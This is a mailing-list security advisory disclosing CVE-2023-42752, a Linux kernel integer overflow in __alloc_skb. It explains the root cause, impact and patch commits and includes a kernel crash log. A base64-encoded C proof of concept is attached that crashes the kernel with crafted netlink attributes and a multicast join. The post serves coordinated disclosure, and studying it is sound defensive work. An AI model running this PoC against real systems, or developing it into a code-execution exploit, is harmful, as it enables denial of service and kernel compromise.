Received: (qmail 22485 invoked by uid 550); 18 Sep 2023 23:10:47 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 26516 invoked from network); 18 Sep 2023 20:54:51 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20230601; t=1695070480; x=1695675280; darn=lists.openwall.com;
        h=to:subject:message-id:date:from:mime-version:from:to:cc:subject
         :date:message-id:reply-to;
        bh=x4tolGv14ozFlA1lavXTXujfjDAYMgAwZVUhfqlwX7I=;
        b=OTJR+asKYYcAiTfxanwP+ecvPcU2rYKJwZ085SAI40YqV93Hr97pzBbBSPQwXxlyVY
         g8XqqbaQoam+NI8r0RbLArhga4zuJefX5pkTITtuvPiANIB98xM6Xj5aBUKaPM7PtDtu
         aM9uTRoX1Tqbzkfy3vgioBWzLqsi0EVmxWFGeq74bKe1PBRY2v5SosMpgKcYWVc24ON/
         ClVeUOlA0P0toH8sodyTQH1mb5HK9VnNQxwWfKQBdmOiiTrdSAHGOLuaPRGRe1lcZTvB
         rPykgMFqta+PzN/X++UwIQLvOBj9ArWeFXxPhnm/WqeYIHyJqfOLOkU5Wo49arxkZX6f
         k15w==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1695070480; x=1695675280;
        h=to:subject:message-id:date:from:mime-version:x-gm-message-state
         :from:to:cc:subject:date:message-id:reply-to;
        bh=x4tolGv14ozFlA1lavXTXujfjDAYMgAwZVUhfqlwX7I=;
        b=PK4bk+V3Yk89ZCcZNVpvvjRB7iAmyjHXtb+EHu/VcV+9Fn4qKwzT3E1cnqqvicHDfX
         qHYplLN/POSqYA26nbqxPdxz0yGGpvpPMTXmoZBE8tyCkUnzERUcu1mA9A5mxJlZiVhA
         rq9/41zd017MBKTgBr29XtSl2NBbZhIGLOPTKTlpoMfSoPsOB1AfQneOlY2MXcTvAHHX
         J3FMVitOTvUIgMRHHSv6tqhmtU4DK1T0ZYd3LffkoI71wDXDFjsiu6qoSDlfZeNHfGWm
         Qc23KrU+TUGjHwgSCr5KqrEOz0YrWKNm8zxnL1ajFSVXOvjn9767CNBVnR8fHCP7hK6V
         Cq4g==
X-Gm-Message-State: AOJu0Yzmhk06pnOMAo8zs3tHk6pNTnPebhsNb7bQkN5PPHNoHOEDHis3
	2fv9koP74aTHVaB9mkc7NZvaYoeKmHLNNd5Wgb8v+PlhkLTi4uOw
X-Google-Smtp-Source: AGHT+IEMiRC7Sn5MA5p5T3I9teZqGMh6Z/fjP0z7Eda2pk/sFcu3FYLLSacJEHrVGskdAZ6SXo+Q36tcjwUc0YrEct8=
X-Received: by 2002:a17:906:224b:b0:9ad:786d:72ae with SMTP id
 11-20020a170906224b00b009ad786d72aemr8592158ejr.75.1695070479800; Mon, 18 Sep
 2023 13:54:39 -0700 (PDT)
MIME-Version: 1.0
From: Kyle Zeng <zengyhkyle@gmail.com>
Date: Mon, 18 Sep 2023 13:54:03 -0700
Message-ID: <CADW8OBsWg915wHWVkMEtoMS1e11bBK-ohU8LEHm5nop=Sj2WZA@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: multipart/mixed; boundary="000000000000d2314c0605a85940"
Subject: [oss-security] [CVE-2023-42752] integer overflow in Linux kernel leading to
 exploitable memory access

--000000000000d2314c0605a85940
Content-Type: text/plain; charset="UTF-8"

Hi there,

I recently found an integer overflow in the Linux kernel, which leads
to the kernel allocating `skb_shared_info` in the userspace, which is
exploitable in systems without SMAP protection since `skb_shared_info`
contains references to function pointers.

I verified the existence of the vulnerability on both the main tree
and v6.1.y, more versions may be affected (potentially all stable
trees).

[Root Cause]

The root cause of the vulnerability is an insufficient check for
integer overflow in `__alloc_skb`. As shown below:
```
struct sk_buff *__alloc_skb(unsigned int size, ...)
{
        ......
        data = kmalloc_reserve(&size, gfp_mask, node, &pfmemalloc);
        if (unlikely(!data))
                goto nodata;
        ......
}
```
`size` is an `unsigned int` and it is potentially controlled by users.
In `kmalloc_reserve`, it will round up the size by `PAGE_SIZE <<
get_order(size);` in `kmalloc_size_roundup`. Since `size` is `unsigned
int`, the roundup logic will make it 0 if the original value is
something huge such as 0xfffffed0. As a result, `data` will actually
become `ZERO_SIZE_PTR`, which is 0x10 instead of 0. Since the check
does not consider the case, the kernel will happily continue
processing the `data` as if it is a valid kernel pointer.

Later when the kernel tries to finalize the skb object in
`__finalize_skb_around`, it has the code: `shinfo = skb_shinfo(skb);`,
which is `skb->head+skb->end` where `skb->head` is 0x10 and `skb->end`
is a large size such as 0xfffffed0. As a result, `shinfo` points to a
userspace pointer.

The kernel crashes at `memset(shinfo, 0, offsetof(struct
skb_shared_info, dataref));` in systems with SMAP enabled.

The root cause of the bug was introduced in v6.2-rc1 in
https://git.kernel.org/pub/scm/linux/kernel/git/netdev/net.git/commit/?id=12d6c1d3a2ad.
But it gets backported to all stable trees, which may potentially
introduce the bug to stable trees (that's why I could trigger the bug
in v6.1.y). According to Vegard Nossum, this is the backported buggy
patch: https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/?id=0dbc898f5917

[Impact]

* The vulnerability is likely exploitable in systems without SMAP
protection since `shinfo` has a function pointer member
`destructor_arg`. Attackers can overwrite it to obtain code execution
in kernel space.
* The vulnerability can lead to local DoS from a user having access to
user namespace
* The vulnerability cannot be triggered remotely according to Eric Dumazet

[Patch]

I already contacted the linux kernel security team and assisted them
in fixing the vulnerability.
The patch consists of two commits:
[1] https://git.kernel.org/pub/scm/linux/kernel/git/netdev/net.git/commit/?id=915d975b2ffa
[2] https://git.kernel.org/pub/scm/linux/kernel/git/netdev/net.git/commit/?id=c3b704d4a4a2

[Proof-of-Concept]

A crashing poc is attached.

Thanks,
Kyle Zeng

=================[Crashing Splash]==========================

[    4.367486] BUG: unable to handle page fault for address: 00000000fffffed0
[    4.367792] #PF: supervisor write access in kernel mode
[    4.368029] #PF: error_code(0x0002) - not-present page
[    4.368260] PGD da2f067 P4D da2f067 PUD 0
[    4.368447] Oops: 0002 [#1] PREEMPT SMP KASAN NOPTI
[    4.368668] CPU: 0 PID: 440 Comm: poc Tainted: G        W          6.5.0+ #47
[    4.368987] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996),
BIOS 1.15.0-1 04/01/2014
[    4.369355] RIP: 0010:memset_orig+0x72/0xac
[    4.369546] Code: 47 28 48 89 47 30 48 89 47 38 48 8d 7f 40 75 d8
0f 1f 84 00 00 00 00 00 89 d1 83 e1 38 74 14 c1 e9 03 66 0f 1f 44 00
00 ff c9 <48> 89 07 48 8d 7f 08 75 f5 83 e2 07 74 0a ff ca 88 07 48 8d
7f 01
[    4.370379] RSP: 0000:ffff88800e627a48 EFLAGS: 00010206
[    4.370626] RAX: 0000000000000000 RBX: 0000000000000010 RCX: 0000000000000003
[    4.370947] RDX: 0000000000000020 RSI: 0000000000000000 RDI: 00000000fffffed0
[    4.371263] RBP: 00000000fffffec0 R08: ffff88800d8faad7 R09: 0000000000000000
[    4.371580] R10: 00000000fffffed0 R11: ffffed1001b1f55b R12: 1ffff11001b1f557
[    4.371896] R13: ffff88800d8faac0 R14: dffffc0000000000 R15: 1ffff11001b1f558
[    4.372212] FS:  000000000207a3c0(0000) GS:ffff888036000000(0000)
knlGS:0000000000000000
[    4.372568] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    4.372825] CR2: 00000000fffffed0 CR3: 000000001115c005 CR4: 0000000000770ef0
[    4.373147] PKRU: 55555554
[    4.373278] Call Trace:
[    4.373392]  <TASK>
[    4.373491]  ? __die_body+0x67/0xb0
[    4.373653]  ? page_fault_oops+0x65a/0x7f0
[    4.373839]  ? exc_page_fault+0x76/0xe0
[    4.374013]  ? asm_exc_page_fault+0x22/0x30
[    4.374202]  ? memset_orig+0x72/0xac
[    4.374371]  __build_skb_around+0x202/0x3c0
[    4.374560]  __alloc_skb+0x214/0x4e0
[    4.374724]  igmpv3_newpack+0xf8/0xfb0
[    4.374895]  add_grhead+0x6e/0x2b0
[    4.375051]  add_grec+0xfcf/0x12d0
[    4.375216]  igmp_ifc_timer_expire+0x72c/0xd20
[    4.375412]  ? igmp_gq_timer_expire+0x90/0x90
[    4.375614]  call_timer_fn+0xb9/0x1c0
[    4.375781]  ? igmp_gq_timer_expire+0x90/0x90
[    4.375984]  __run_timers+0x683/0x790
[    4.376148]  run_timer_softirq+0x46/0x80
[    4.376330]  __do_softirq+0x22e/0x51e
[    4.376497]  __irq_exit_rcu+0x6f/0x120
[    4.376673]  sysvec_apic_timer_interrupt+0x43/0xb0
[    4.376884]  asm_sysvec_apic_timer_interrupt+0x16/0x20
[    4.377119] RIP: 0033:0x401e38
[    4.377260] Code: 53 07 00 89 45 bc 8b 05 3a 36 10 00 48 8d 55 b8
41 b8 08 00 00 00 48 89 d1 ba 23 00 00 00 be 00 00 00 00 89 c7 e8 c8
32 07 00 <eb> fe f3 0f 1e fa 55 48 89 e5 48 83 ec 70 48 89 7d 98 48 89
75 90
[    4.378101] RSP: 002b:00007ffc1f22b390 EFLAGS: 00000207
[    4.378370] RAX: 0000000000000000 RBX: 00007ffc1f22b5d8 RCX: 000000000047510e
[    4.378725] RDX: 0000000000000023 RSI: 0000000000000000 RDI: 0000000000000006
[    4.379060] RBP: 00007ffc1f22b3e0 R08: 0000000000000008 R09: 0000000000000000
[    4.379385] R10: 00007ffc1f22b398 R11: 0000000000000206 R12: 0000000000000001
[    4.379717] R13: 00007ffc1f22b5c8 R14: 00000000004ff740 R15: 0000000000000002
[    4.380048]  </TASK>
[    4.380152] Modules linked in:
[    4.380296] CR2: 00000000fffffed0
[    4.380451] ---[ end trace 0000000000000000 ]---
[    4.380661] RIP: 0010:memset_orig+0x72/0xac
[    4.380851] Code: 47 28 48 89 47 30 48 89 47 38 48 8d 7f 40 75 d8
0f 1f 84 00 00 00 00 00 89 d1 83 e1 38 74 14 c1 e9 03 66 0f 1f 44 00
00 ff c9 <48> 89 07 48 8d 7f 08 75 f5 83 e2 07 74 0a ff ca 88 07 48 8d
7f 01
[    4.381706] RSP: 0000:ffff88800e627a48 EFLAGS: 00010206
[    4.381949] RAX: 0000000000000000 RBX: 0000000000000010 RCX: 0000000000000003
[    4.382275] RDX: 0000000000000020 RSI: 0000000000000000 RDI: 00000000fffffed0
[    4.382607] RBP: 00000000fffffec0 R08: ffff88800d8faad7 R09: 0000000000000000
[    4.382926] R10: 00000000fffffed0 R11: ffffed1001b1f55b R12: 1ffff11001b1f557
[    4.383271] R13: ffff88800d8faac0 R14: dffffc0000000000 R15: 1ffff11001b1f558
[    4.383590] FS:  000000000207a3c0(0000) GS:ffff888036000000(0000)
knlGS:0000000000000000
[    4.384012] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    4.384298] CR2: 00000000fffffed0 CR3: 000000001115c005 CR4: 0000000000770ef0
[    4.384635] PKRU: 55555554
[    4.384763] Kernel panic - not syncing: Fatal exception in interrupt
[    4.385239] Kernel Offset: disabled
[    4.385413] Rebooting in 1000 seconds..

--000000000000d2314c0605a85940
Content-Type: text/x-csrc; charset="US-ASCII"; name="poc.c"
Content-Disposition: attachment; filename="poc.c"
Content-Transfer-Encoding: base64
Content-ID: <f_lmpd5lss0>
X-Attachment-Id: f_lmpd5lss0

I2RlZmluZSBfR05VX1NPVVJDRSANCg0KI2luY2x1ZGUgPHN0ZGludC5oPg0K
I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RkbGliLmg+DQojaW5j
bHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8c3lzL3N5c2NhbGwuaD4NCiNp
bmNsdWRlIDxzeXMvdHlwZXMuaD4NCiNpbmNsdWRlIDx1bmlzdGQuaD4NCg0K
I2luY2x1ZGUgPHN5cy9zb2NrZXQuaD4NCiNpbmNsdWRlIDxsaW51eC9ydG5l
dGxpbmsuaD4NCiNpbmNsdWRlIDxuZXRpbmV0L2luLmg+DQojaW5jbHVkZSA8
YXJwYS9pbmV0Lmg+DQoNCnVpbnQ2NF90IHJbMl0gPSB7MHhmZmZmZmZmZmZm
ZmZmZmZmLCAweGZmZmZmZmZmZmZmZmZmZmZ9Ow0KaW50IG5sX3NvY2s7DQpp
bnQgc29jazsNCg0Kdm9pZCAqYnVpbGRfcGt0KHN0cnVjdCBubG1zZ2hkciAq
aGRyLCBzdHJ1Y3QgaWZpbmZvbXNnICppZmluZm9tc2csIHZvaWQgKmF0dHJz
LCBpbnQgYXR0cl9sZW4pDQp7DQoJdm9pZCAqcGF5bG9hZCA9IGNhbGxvYygx
LCAweDEwMDApOw0KCXZvaWQgKnB0ciA9IHBheWxvYWQ7DQoJaGRyLT5ubG1z
Z19sZW4gPSBzaXplb2Yoc3RydWN0IG5sbXNnaGRyKSArIHNpemVvZihzdHJ1
Y3QgaWZpbmZvbXNnKSArIGF0dHJfbGVuOw0KCXByaW50Zigibmxtc2dfbGVu
OiAlI3hcbiIsIGhkci0+bmxtc2dfbGVuKTsNCglwcmludGYoImF0dHJfbGVu
OiAlI3hcbiIsIGF0dHJfbGVuKTsNCg0KCW1lbWNweShwdHIsIGhkciwgc2l6
ZW9mKHN0cnVjdCBubG1zZ2hkcikpOw0KCXB0ciArPSBzaXplb2Yoc3RydWN0
IG5sbXNnaGRyKTsNCgltZW1jcHkocHRyLCBpZmluZm9tc2csIHNpemVvZihz
dHJ1Y3QgaWZpbmZvbXNnKSk7DQoJcHRyICs9IHNpemVvZihzdHJ1Y3QgaWZp
bmZvbXNnKTsNCgltZW1jcHkocHRyLCBhdHRycywgYXR0cl9sZW4pOw0KCXJl
dHVybiBwYXlsb2FkOw0KfQ0KDQppbnQgbWFpbih2b2lkKQ0Kew0KCS8vY29u
dGV4dF9zZXR1cCgpOw0KCW5sX3NvY2sgPSBzb2NrZXQoQUZfTkVUTElOSywg
U09DS19SQVcsIE5FVExJTktfUk9VVEUpOw0KDQoJc3RydWN0IG5sbXNnaGRy
IG5sbXNnaGRyID0gew0KCQkubmxtc2dfbGVuID0gMCwNCgkJLm5sbXNnX3R5
cGUgPSBSVE1fTkVXTElOSywNCgkJLm5sbXNnX2ZsYWdzID0gMHg4MDEsIC8v
IE5MTV9GX1JFUVVFU1QgfCBOTE1fRl9BUFBFTkQNCgkJLm5sbXNnX3NlcSA9
IDAsIC8vIE5MX0FVVE9fU0VRDQoJCS5ubG1zZ19waWQgPSAwIC8vIE5MX0FV
VE9fUElEDQoJfTsNCg0KCXN0cnVjdCBpZmluZm9tc2cgaWZpbmZvbXNnID0g
ew0KCQkuaWZpX2ZhbWlseSA9IDAsDQoJCS5fX2lmaV9wYWQgPSAwLA0KCQku
aWZpX3R5cGUgPSAwLA0KCQkuaWZpX2luZGV4ID0gMCwNCgkJLmlmaV9mbGFn
cyA9IDAsDQoJCS5pZmlfY2hhbmdlID0gMA0KCX07DQoNCgljaGFyIGF0dHJz
W10gPSAiXHgwOFx4MDAiIlx4MWJceDAwIiJceDAwXHgwMFx4MDBceDAwIg0K
CQkJCSAgICJceDA4XHgwMCIiXHgwNFx4MDAiIlx4ZmZceGZmXHhmZlx4N2Yi
Ow0KCXZvaWQgKnBheWxvYWQgPSBidWlsZF9wa3QoJm5sbXNnaGRyLCAmaWZp
bmZvbXNnLCBhdHRycywgc2l6ZW9mKGF0dHJzKS0xKTsNCg0KDQoJc2VuZChu
bF9zb2NrLCBwYXlsb2FkLCBubG1zZ2hkci5ubG1zZ19sZW4sIDApOw0KDQoJ
c29jayA9IHNvY2tldChBRl9JTkVULCBTT0NLX0RHUkFNLCBJUFBST1RPX0lQ
KTsNCg0KCXN0cnVjdCBpcF9tcmVxIG1yZXE7DQoJbXJlcS5pbXJfbXVsdGlh
ZGRyLnNfYWRkciA9IGluZXRfYWRkcigiMjI0LjAuMC4yIik7DQoJbXJlcS5p
bXJfaW50ZXJmYWNlLnNfYWRkciA9IGluZXRfYWRkcigiMTI3LjAuMC4xIik7
DQoNCglzZXRzb2Nrb3B0KHNvY2ssIFNPTF9JUCwgSVBfQUREX01FTUJFUlNI
SVAsICZtcmVxLCBzaXplb2YobXJlcSkpOw0KDQoJLy93aGlsZSgxKTsNCgly
ZXR1cm4gMDsNCn0NCg==

--000000000000d2314c0605a85940--
